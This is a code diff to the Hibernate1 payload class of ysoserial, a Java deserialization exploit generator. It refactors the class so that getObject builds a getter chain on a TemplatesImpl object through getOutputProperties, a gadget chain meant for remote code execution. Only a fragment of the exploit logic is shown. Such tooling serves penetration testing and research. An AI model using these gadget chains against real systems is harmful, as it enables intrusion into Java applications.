@@ -43,7 +43,7 @@ import ysoserial.payloads.util.Reflections;
  */
 @Authors({ Authors.MBECHLER })
 @PayloadTest(precondition = "isApplicableJavaVersion")
-public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
+public class Hibernate1 extends ParameterizedTransletObjectPayload<Object> implements DynamicDependencies {
     public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAtLeast(7);
     }
@@ -105,10 +105,10 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
     }
 
 
-    public Object getObject ( String command ) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(command);
-        Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
-        return makeCaller(tpl, getters);
+    @Override
+    protected Object getObject(Object templates) throws Exception {
+        Object getters = makeGetter(templates.getClass(), "getOutputProperties");
+        return makeCaller(templates, getters);
     }
 
 
@@ -182,4 +182,5 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
     public static void main ( final String[] args ) throws Exception {
         PayloadRunner.run(Hibernate1.class, args);
     }
+
 }
